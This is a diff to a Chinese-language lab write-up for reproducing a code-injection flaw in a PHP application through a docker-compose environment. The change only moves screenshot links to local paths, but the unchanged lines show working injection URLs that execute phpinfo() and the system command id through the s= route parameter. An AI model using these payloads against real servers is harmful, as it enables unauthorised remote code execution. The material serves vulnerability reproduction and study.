@@ -26,7 +26,7 @@ docker-compose up -d
 
 直接访问`http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D`即可执行`phpinfo()`：
 
-![image-20220302144931898](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203021449975.png)
+![image-20220302144931898](./images/202203021449975.png)
 
 执行系统命令：
 
@@ -34,4 +34,4 @@ docker-compose up -d
 http://your-ip:8080/index.php?s=/index/index/name/$%7Bsystem(id)%7D
 ```
 
-![image-20220302145029395](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203021450448.png)
+![image-20220302145029395](./images/202203021450448.png)
